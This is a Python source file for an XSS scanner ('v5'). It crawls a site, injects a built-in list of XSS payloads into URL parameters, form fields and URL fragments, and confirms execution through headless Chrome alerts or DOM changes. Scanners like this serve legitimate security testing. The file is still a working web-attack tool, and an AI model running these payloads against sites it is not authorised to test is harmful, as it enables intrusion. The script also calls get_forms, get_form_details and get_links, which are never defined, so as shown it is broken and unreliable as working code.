# scanner.py (v5)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote # Added quote
import argparse
import sys
import time
from collections import deque
import concurrent.futures
import os

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
DOM_PAYLOAD_ATTRIBUTE = 'data-xss-success'
DOM_PAYLOAD_VALUE = 'true'
DEFAULT_PAYLOADS = [
    "<script>alert('XSS_Alert1')</script>", # Less likely for DOM via hash w/o script execution sink
    "'><script>alert('XSS_Alert2')</script>", # Less likely for DOM via hash w/o script execution sink
    f"<img src=x onerror=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}', '{DOM_PAYLOAD_VALUE}')\">",
    "<img src=x onerror=alert('XSS_Alert4')>",
    "<svg onload=alert('XSS_A7')>",
    "<svg onload=\"document.body.setAttribute('data-xss-success','true')\">",
    "javascript:alert('XSS_Alert5')", # Unlikely via hash directly, but keep for other tests
    "><details open ontoggle=alert('XSS_A12b')><summary>X</summary></details>", # Event-based
    "><img src=x onerror=alert('XSS_B3')>", # Breakout + event
]
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS = 10

# --- Helper Functions ---

def load_payloads(filepath):
    """Loads payloads from a file, one per line."""
    try:
        if not os.path.exists(filepath):
             print(f"[!] Payload file not found: {filepath}", file=sys.stderr)
             return None
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            # Filter out empty lines and comments
            payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        if not payloads:
             print(f"[!] No valid payloads found in file: {filepath}", file=sys.stderr)
             return None
        print(f"[*] Loaded {len(payloads)} payloads from {filepath}")
        return payloads
    except IOError as e:
        print(f"[!] Error reading payload file {filepath}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Unexpected error loading payload file {filepath}: {e}", file=sys.stderr)
        return None

def setup_driver():
    """Sets up the Selenium WebDriver."""
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])

    try:
        os.environ['WDM_LOG_LEVEL'] = '0'
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(15)
        return driver
    except ValueError as ve:
         print(f"[!] WebDriver Manager Error: {ve}. Check network or cache.", file=sys.stderr)
         return None
    except WebDriverException as wde:
        print(f"[!] WebDriver Error during setup: {wde}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr)
        return None

def confirm_xss_with_headless(url, driver, payload_description=""):
    """Uses Selenium to visit a URL and check for an alert OR specific DOM change."""
    if not driver:
        return None, None

    print(f"  [*] Attempting headless confirmation: {payload_description} -> {url[:100]}...")
    confirmation_type = None
    confirmation_detail = ""

    try:
        # Use driver.get for navigation, handles basic URL encoding needed by browser
        driver.get(url)
        time.sleep(0.1) # Small delay

        # 1. Check for Alert
        try:
            WebDriverWait(driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            confirmation_detail = f"Alert('{alert_text}')"
            print(f"  [+] CONFIRMED via Alert: {confirmation_detail}")
            alert.accept()
            confirmation_type = "Alert"
            return confirmation_type, confirmation_detail
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                confirmation_detail = f"Unexpected Alert('{alert_text}')"
                print(f"  [+] CONFIRMED via Unexpected Alert: {confirmation_detail}")
                alert.accept()
                confirmation_type = "Alert (Unexpected)"
                return confirmation_type, confirmation_detail
            except NoAlertPresentException:
                 print("  [!] Alert disappeared before handling.", file=sys.stderr)

        # 2. Check for DOM attribute change
        if not confirmation_type:
            try:
                # Explicitly wait for the attribute condition
                WebDriverWait(driver, 0.5).until(
                    lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE
                )
                confirmation_detail = f"DOM attribute '{DOM_PAYLOAD_ATTRIBUTE}'='{DOM_PAYLOAD_VALUE}'"
                print(f"  [+] CONFIRMED via DOM Change: {confirmation_detail}")
                confirmation_type = "DOM Change"
                return confirmation_type, confirmation_detail
            except TimeoutException:
                pass # Attribute not found/changed
            except NoSuchElementException:
                print("  [!] Body element not found during DOM check.", file=sys.stderr)
            except Exception as e_dom:
                 print(f"  [!] Error during DOM check: {e_dom}", file=sys.stderr)

        # print("  [-] No Alert or specific DOM change detected within timeout.") # Reduce noise
        return None, None

    except TimeoutException:
         print(f"  [!] Page load timed out during confirmation: {url[:100]}", file=sys.stderr)
         return None, None
    except WebDriverException as wde:
         # Catch navigation errors etc.
         if "net::ERR_INVALID_URL" in str(wde):
              print(f"  [!] Invalid URL generated for confirmation (check payload encoding?): {url[:100]}", file=sys.stderr)
         else:
              print(f"  [!] WebDriver error during confirmation for {url[:100]}: {wde}", file=sys.stderr)
         return None, None
    except Exception as e:
        print(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}", file=sys.stderr)
        return None, None

# --- Functions for Reflected/Stored Scanning (Tasks for ThreadPoolExecutor) ---

def task_test_url_param(url, param_name, payload, session):
    """Task: Tests a single URL parameter for reflection."""
    parsed_url = urlparse(url)
    try:
        query_params = parse_qs(parsed_url.query)
        if param_name not in query_params: return None

        modified_params = query_params.copy()
        modified_params[param_name] = [payload]
        modified_query = urlencode(modified_params, doseq=True)
        # Ensure the base path/params are preserved correctly
        test_url = parsed_url._replace(query=modified_query).geturl()

        response = session.get(test_url, timeout=10, allow_redirects=True)
        response_body = response.content.decode(errors='ignore')
        final_url = response.url

        if payload in response_body:
            return {'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'payload': payload, 'final_url': final_url}
        return None

    except requests.exceptions.Timeout: return None
    except requests.exceptions.RequestException: return None # Less verbose errors for tasks
    except Exception: return None # Catch all for task stability

def task_test_form(form_details, url, payload, session):
    """Task: Tests a single form submission for reflection."""
    target_url = urljoin(url, form_details['action'])
    inputs = form_details['inputs']
    data = {}
    tested_fields = []

    for input_item in inputs:
        if not input_item.get('name'): continue
        if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
            data[input_item['name']] = payload
            tested_fields.append(input_item['name'])
        else:
            data[input_item['name']] = input_item['value']

    if not tested_fields: return None

    try:
        response = None
        if form_details['method'] == 'post':
            response = session.post(target_url, data=data, timeout=10, allow_redirects=True)
        else:
            response = session.get(target_url, params=data, timeout=10, allow_redirects=True)

        response_body = response.content.decode(errors='ignore')
        final_url = response.url

        if payload in response_body:
            return {'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'payload': payload, 'final_url': final_url}
        return None

    except requests.exceptions.Timeout: return None
    except requests.exceptions.RequestException: return None
    except Exception: return None

# --- Scanning Functions ---

def scan_page_reflected(url, session, executor, payload_list):
    """Scans a single page for REFLECTED XSS using ThreadPoolExecutor."""
    # print(f"\n[*] Scanning (Reflected) {url}...") # Reduce noise
    potential_vulnerabilities = []
    futures = []

    # 1. Submit tasks for URL Parameters
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if query_params:
        # print(f"[*] Testing {len(query_params)} URL parameters ({len(payload_list)} payloads each)...")
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            for payload in payload_list:
                futures.append(executor.submit(task_test_url_param, url, param_name, payload, session))

    # 2. Submit tasks for Forms
    forms = get_forms(url, session)
    if forms:
        # print(f"[*] Testing {len(forms)} forms ({len(payload_list)} payloads each)...")
        for form in forms:
            form_details = get_form_details(form)
            if not form_details['inputs']: continue
            for payload in payload_list:
                 futures.append(executor.submit(task_test_form, form_details, url, payload, session))

    # 3. Collect results from completed tasks (potential reflections)
    if futures:
        # print(f"[*] Waiting for {len(futures)} reflection checks to complete...")
        processed_count = 0
        for future in concurrent.futures.as_completed(futures):
            processed_count += 1
            result = future.result()
            if result:
                potential_vulnerabilities.append(result)
            # Add progress indicator if needed
        # print(f"[*] Reflection checks complete for {url}.")

    return potential_vulnerabilities

def scan_for_dom_xss(url, driver, payload_list):
    """Scans for DOM XSS by injecting payloads into the URL fragment."""
    if not driver:
        return [] # Cannot perform DOM XSS checks without headless browser

    print(f"[*] Scanning (DOM XSS via Hash) {url}...")
    confirmed_dom_vulns = []
    # Ensure base URL doesn't already have a fragment we overwrite carelessly
    base_url = url.split('#')[0]

    for payload in payload_list:
        # Construct the test URL with payload in fragment
        # We need to be careful with encoding here.
        # The browser needs a valid URL, but JS might decode the hash.
        # Let's try basic quoting for browser navigation safety.
        try:
             # Quote unsafe characters for the URL fragment part
             encoded_payload = quote(payload, safe=':/~?=&%') # Adjust 'safe' as needed
             test_url = f"{base_url}#{encoded_payload}"
        except Exception as e_quote:
             print(f"  [!] Error encoding payload for URL hash: {payload[:50]}... ({e_quote})", file=sys.stderr)
             continue


        # Use headless browser to navigate and check for execution
        confirmation_type, confirmation_detail = confirm_xss_with_headless(test_url, driver, payload_description=f"Hash Payload: {payload[:50]}...")
        if confirmation_type:
            confirmed_dom_vulns.append({
                'type': 'DOM-based XSS',
                'url': url, # Original URL visited
                'source': 'URL Fragment (#)',
                'payload': payload,
                'confirmed': True,
                'confirmation_type': confirmation_type,
                'confirmation_detail': confirmation_detail,
                'final_url': test_url # The URL that triggered it
            })
            # Optimization: If one payload works via hash, maybe stop? Depends on goal.
            # break

    print(f"[*] DOM XSS Scan complete for {url}. Found {len(confirmed_dom_vulns)} confirmed.")
    return confirmed_dom_vulns


# --- Crawler ---
def crawl(start_url, max_depth, session, driver, executor, payload_list):
    """Performs a breadth-first crawl and scan (Reflected + DOM)."""
    if max_depth <= 0: max_depth = 1

    base_domain = urlparse(start_url).netloc
    if not base_domain:
        print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr)
        return []

    queue = deque([(start_url, 0)])
    visited = {start_url}
    all_vulnerabilities = [] # Combined list

    while queue:
        current_url, current_depth = queue.popleft()
        print(f"\n--- Scanning URL: {current_url} (Depth: {current_depth}) ---")

        if current_depth >= max_depth: continue

        # --- Scan for Reflected/Stored (using ThreadPool) ---
        potential_reflected = scan_page_reflected(current_url, session, executor, payload_list)

        # Perform Headless Confirmation for potential reflected hits (Sequentially)
        confirmed_reflected = []
        if driver and potential_reflected:
            # Consolidate checks per unique final URL generated by reflected tests
            unique_confirm_targets = {}
            for pv in potential_reflected:
                 if pv['final_url'] not in unique_confirm_targets:
                      unique_confirm_targets[pv['final_url']] = []
                 unique_confirm_targets[pv['final_url']].append(pv) # Group potential vulns by the URL that needs checking

            print(f"[*] Confirming {len(unique_confirm_targets)} unique URLs from reflected checks...")
            confirmed_count = 0
            for final_url, associated_vulns in unique_confirm_targets.items():
                # Check only once per unique URL
                payload_desc = f"Reflected Payload(s) leading to this URL" # Simplified desc
                confirmation_type, confirmation_detail = confirm_xss_with_headless(final_url, driver, payload_desc)
                if confirmation_type:
                    # Apply confirmation to all potential vulns matching this final_url
                    for pv in associated_vulns:
                        pv['confirmed'] = True
                        pv['confirmation_type'] = confirmation_type
                        pv['confirmation_detail'] = confirmation_detail
                        confirmed_reflected.append(pv)
                        confirmed_count += 1
            print(f"[*] Reflected confirmation complete. Confirmed {confirmed_count} instances.")

        all_vulnerabilities.extend(confirmed_reflected)

        # --- Scan for DOM XSS (Sequentially using driver) ---
        if driver: # Only if headless is enabled
             confirmed_dom = scan_for_dom_xss(current_url, driver, payload_list)
             all_vulnerabilities.extend(confirmed_dom)
        else:
             print("[*] Skipping DOM XSS checks as headless browser is disabled.")


        # --- Find Links for Next Level ---
        if current_depth < max_depth - 1:
            print(f"[*] Discovering links on {current_url}...")
            new_links = get_links(current_url, session, base_domain)
            added_count = 0
            for link in new_links:
                if link not in visited:
                    visited.add(link)
                    queue.append((link, current_depth + 1))
                    added_count += 1
            if added_count > 0:
                 print(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")

    print(f"\n[*] Crawler finished. Visited {len(visited)} unique URLs.")
    return all_vulnerabilities


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner v5 (DOM XSS Detection) - Use Responsibly!")
    # Arguments remain mostly the same
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation AND DOM XSS checks")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS, help=f"Number of concurrent workers for reflection checks (default: {MAX_WORKERS})")
    parser.add_argument("-pL", "--payload-list", help="Path to a file containing payloads (one per line)")
    # Could add: --skip-reflected, --skip-dom

    args = parser.parse_args()
    target_url = args.url
    max_depth = args.depth
    use_headless = not args.no_headless
    num_workers = args.workers
    payload_file = args.payload_list

    # Load payloads
    payloads_to_use = DEFAULT_PAYLOADS
    if payload_file:
        loaded_payloads = load_payloads(payload_file)
        if loaded_payloads:
            payloads_to_use = loaded_payloads
        else:
            print("[!] Failed to load payloads from file, using default list.", file=sys.stderr)
            # sys.exit(1) # Option: exit if payload file fails
    else:
        print("[*] No payload list provided, using default list.")


    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver:
            print("[!] Proceeding without headless confirmation or DOM XSS checks.")
            use_headless = False
    else:
         print("[*] Headless confirmation and DOM XSS checks disabled via command line.")

    # Use a session object
    session = requests.Session()
    session.headers.update({'User-Agent': 'XSSScanner/0.5 (+https://github.com/your-repo)'}) # Update version

    start_time = time.time()

    # Create ThreadPoolExecutor for reflected checks
    all_confirmed_vulns = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        all_confirmed_vulns = crawl(target_url, max_depth, session, driver, executor, payloads_to_use)

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")

    if all_confirmed_vulns:
        print(f"\n[***] Found {len(all_confirmed_vulns)} CONFIRMED XSS vulnerabilities:")
        # Sort/Group for clarity
        all_confirmed_vulns.sort(key=lambda x: (x['url'], x['type']))
        for vuln in all_confirmed_vulns:
             base_info = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({vuln.get('confirmation_detail', 'N/A')}), Payload: {vuln['payload']}"
             if vuln['type'] == 'URL Parameter':
                 print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'Form Input':
                  print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS':
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, {base_info}, Trigger URL: {vuln['final_url']}")
             else: # Fallback for unexpected types
                  print(f"  - {vuln}")

    else:
        print("\n[*] No vulnerabilities confirmed via headless browser (Alert or DOM change).")
        if not use_headless:
             print("    (Headless confirmation and DOM XSS checks were disabled.)")


    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup Selenium Driver
    if driver:
        print("[*] Closing headless browser...")
        driver.quit()

